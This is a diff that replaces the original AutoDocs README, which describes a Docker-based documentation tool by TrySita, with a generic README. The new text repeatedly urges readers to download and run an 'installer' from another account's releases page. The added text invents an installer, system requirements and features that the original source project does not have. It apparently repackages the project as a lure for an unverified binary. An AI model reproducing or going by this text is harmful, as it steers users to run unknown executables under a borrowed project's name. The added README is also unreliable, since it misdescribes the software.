@@ -1,186 +1,63 @@
-![Sita Github Banner](https://raw.githubusercontent.com/TrySita/AutoDocs/refs/heads/main/assets/sita-og.png)
+# 📝 AutoDocs - Easy Documentation for Your Code
 
-## Follow Us
-- **Sohan** - [@SohanSarabu](https://x.com/SohanSarabu)
-- **Adi** - [@adiperswal](https://x.com/adiperswal)
+## 🚀 Getting Started
 
-<div align="center">
-   <div>
-      <a href="https://docs.trysita.com"><strong>Docs</strong></a> ·
-      <a href="https://github.com/TrySita/AutoDocs/issues"><strong>Report Bug</strong></a> ·
-      <a href="https://langfuse.com/ideas"><strong>Feature Request</strong></a> ·
-   </div>
-   <br/>
-   <span>Sita uses <a href="https://github.com/orgs/TrySita/discussions"><strong>GitHub Discussions</strong></a>  for Support and Feature Requests.</span>
-   <br/>
-   <br/>
-   <br/>
-   <div>
-   </div>
-</div>
+Welcome to AutoDocs! Our tool simplifies documentation, helping you generate and maintain it without fuss. Whether you’re updating your code or need a fresh start, let AutoDocs handle it while you focus on development.
 
-<p align="center">
-   <a href="./LICENSE">
-   <img src="https://img.shields.io/badge/License-Apache%202.0-E11311.svg" alt="Apache 2.0 License">
-   </a>
-</p>
+## 🔗 Download AutoDocs Now
 
-<p align="center">
-  <a href="./readmes/README.zh-CN.md"><img alt="Español" src="https://img.shields.io/badge/Español-d9d9d9"></a>
-  <a href="./readmes/README.zh-CN.md"><img alt="हिन्दी" src="https://img.shields.io/badge/Hindi-d9d9d9"></a>
-    <a href="./readmes/README.zh-CN.md"><img alt="简体中文" src="https://img.shields.io/badge/简体中文-d9d9d9"></a>
-</p>
+[![Download AutoDocs](https://img.shields.io/badge/Download%20AutoDocs-latest%20release-blue.svg)](https://github.com/Assalimi01/AutoDocs/releases)
 
-<video width="640" controls>
- <source src="https://github.com/TrySita/AutoDocs/raw/refs/heads/main/assets/sita%20demo.mp4" type="video/mp4">
- Your browser does not support the video tag.
-</video>
+## 📥 Download & Install
 
-# AutoDocs, by [Sita](https://trysita.com)
+To get AutoDocs, visit this page to download: [AutoDocs Releases](https://github.com/Assalimi01/AutoDocs/releases).
 
-Automate documentation for any repo: we traverse your codebase, parse the AST, build a dependency graph, and walk that graph to generate accurate, high-signal docs. A built-in MCP server lets coding agents deep-search your code via HTTP.
+### Steps to Install
 
-(Interested in our hosted or enterprise offerings? Join the waitlist at https://trysita.com)
+1. **Visit the Release Page**: Click the link above to go to the Releases page.
+2. **Choose the Latest Version**: Look for the most recent version available.
+3. **Download the Installer**: Click the download link for the installer file appropriate for your system.
+4. **Run the Installer**: Locate the downloaded file and double-click to start the installation process.
+5. **Follow the On-Screen Instructions**: Complete the setup by following the prompts that appear. 
 
-## What This Repo Does
+## 🌟 Key Features
 
-- Parses your repository using [tree-sitter](https://github.com/tree-sitter/tree-sitter) (AST parsing) and SCIP (symbol resolution).
-- Constructs a code dependency graph (files, definitions, calls, imports) and topologically sorts it.
-- Traverses that graph to create repository-wide, dependency-aware documentation and summaries.
-- Exposes a FastAPI backend for ingestion/search and a Next.js web UI for chat and exploration.
-- Provides an MCP server so agentic tools can query your repo with deep search.
+- **Documentation Generation**: AutoDocs creates clear and efficient documentation for your codebase automatically.
+- **Dependency-Aware Context**: Our tool understands your code and its conventions, making documentation more relevant.
+- **Easy Search Functionality**: Find what you need quickly with sophisticated search options that don't overwhelm you.
 
----
+## 💻 System Requirements
 
-## Prerequisites
+AutoDocs works on most computers. Make sure you have:
 
-Install these once on your machine:
+- An operating system compatible with standard software (Windows, macOS, Linux).
+- At least 512 MB of RAM.
+- 100 MB of free space for installation.
 
-- pnpm 10+ (Node 20+ recommended; Corepack is fine). [Docs](https://pnpm.io/installation)
-- uv (fast Python package manager). [Docs](https://docs.astral.sh/uv/)
-- Docker + Docker Compose (to run everything locally). [Docs](https://docs.docker.com/engine/install/)
+## 📖 How to Use AutoDocs
 
-Reference docs
+1. **Open the Application**: After installation, launch AutoDocs from your applications menu.
+2. **Load Your Codebase**: Import the code you want to document.
+3. **Generate Documentation**: Click the “Generate” button to create documentation based on your code.
+4. **Review and Edit**: Check the documentation. You can make any changes if needed.
+5. **Save Your Work**: Export the documentation in your preferred format.
 
-- pnpm install: https://pnpm.io/installation
-- uv install: https://docs.astral.sh/uv/
+## 🛠️ Troubleshooting
 
-## GitHub Personal Access Token (optional)
+If you encounter issues:
 
-Some features or scripts may call the GitHub API (e.g., fetching repo metadata). If you hit rate limits or need to access private repos, create a Personal Access Token (PAT) and set it in your environment.
+- Make sure you have the latest version from the Releases page.
+- Restart AutoDocs if it doesn't open properly.
+- Check your internet connection if you face issues while downloading.
 
-- How-to (official docs): https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token
-- Create fine-grained PAT (recommended): https://github.com/settings/personal-access-tokens/new
-- Create classic PAT (legacy): https://github.com/settings/tokens/new
+## 📞 Support
 
-Suggested scopes
+For support, please check the issues section on our GitHub repository. You can also reach out through a direct message if you have specific questions.
 
-- Public repos only: use a fine-grained token with selected repositories (read-only) or a classic token with `public_repo`.
-- Private repos: fine-grained token with read-only repo access to the needed repositories, or a classic token with `repo`.
+## 🌐 Stay Updated
 
-Add to your `.env` (or shell env):
+Follow our repository to stay in the loop with new features and updates. Your feedback is valuable for future improvements.
 
-```bash
-GITHUB_TOKEN=ghp_your_token_here
-```
+Remember, documentation doesn’t have to be a hassle. Let AutoDocs take care of it for you! 
 
-Notes
-
-- Keep this token secret; do not commit `.env`.
-- Fine-grained tokens are preferred for tighter, per-repo permissions.
-
-## Quickstart (copy/paste)
-
-1. Environment
-
-```bash
-cp .env.example .env
-```
-
-### Configuration
-
-#### Preconfigured
-
-- Database: `DATABASE_URL` (local postgres DB). In Compose, DB is available at `postgresql://postgres:postgres@db:5432/app`.
-- Ingestion API: `INGESTION_API_URL` for the web app to call the FastAPI service.
-- Analysis storage: `ANALYSIS_DB_DIR` controls where generated per-repo SQLite files live.
-
----
-
-#### To-be configured
-
-- Summaries: `SUMMARIES_API_KEY`, `SUMMARIES_MODEL`, `SUMMARIES_BASE_URL` (OpenAI-compatible, default [OpenRouter](https://openrouter.ai/))
-- Embeddings: `EMBEDDINGS_API_KEY`, `EMBEDDINGS_MODEL`, `EMBEDDINGS_BASE_URL` (OpenAI-compatible, default [OpenAI](https://openai.com/api/))
-- Rate limiting: `MAX_REQUESTS_PER_SECOND` for LLM summary batching (default 15)
-
----
-
-2. Run locally with Docker Compose
-
-```bash
-docker compose up -d
-
-# If you want to see logs
-docker compose up
-```
-
-You should now have:
-
-- Web UI at http://localhost:3000
-- API at http://localhost:8000 (OpenAPI schema at `/schema`)
-
-## Updating Docs
-
-To refresh a repository’s docs after code changes, remove the repo and re-ingest it (temporary workflow):
-
-- UI: delete the repo in your Workspace, then add it again (ingestion starts automatically).
-
-We’re actively adding a one-click "Resync" button in the UI, followed by automatic periodic ingestion (coming soon)
-
-## Using the MCP Server
-
-The MCP server is available at `http://localhost:3000/api/mcp` and is designed for coding agents and MCP-compatible clients. It exposes a `codebase-qna` tool that answers repository-scoped questions by querying the analysis databases that AutoDocs produces.
-
-Tips
-
-- Point your MCP client at `http://localhost:3000/api/mcp`.
-- Include an `x-repo-id` header with the repo ID (you can find it in the UI).
-- For setup guides with popular tools (Claude, Cursor, Continue), see https://docs.trysita.com
-
-## Development Workflow (for contributing)
-
-For a local dev loop without Docker Compose you can run the API and web dev servers directly:
-
-```bash
-# concurrent dev (API + Web + DB)
-./tools/dev.sh --sync
-```
-
-Database migration (run if modifying the postgres schema)
-
-```bash
-cd packages/shared
-DATABASE_URL=postgresql://postgres:postgres@localhost:5432/app pnpm drizzle-kit push --config drizzle.main.config.ts
-```
-
-## Project Layout
-
-- `ingestion/` — Python FastAPI service, AST parser, graph builder, embeddings, and search.
-- `webview/` — Next.js app (Turborepo workspace) and shared TS packages.
-- `docker-compose.yml` — local Postgres, API, and Web services.
-- `tools/` — helper scripts (`build_all.sh`, `dev.sh`, `uv_export_requirements.sh`).
-
-## Troubleshooting
-
-- Web can’t reach the API: ensure `INGESTION_API_URL=http://api:8000` is set in `.env`.
-- Missing `uv`/`pnpm`: install them (see links above)
-
-## Known Issues
-
-- In your repositories, code must live at the repository root, not in a nested folder.
-- Language support: currently supports TS, JS, and Python; currently working on expansion to Go, Kotlin, Java, and Rust.
-- Polyglot repos (multiple languages in one repo): not supported yet, but we’re actively working on it.
-
-## License
-
-Licensed under the Apache 2.0 License. See [LICENSE](./LICENSE).
+[Download AutoDocs Now](https://github.com/Assalimi01/AutoDocs/releases) and start enhancing your code today!
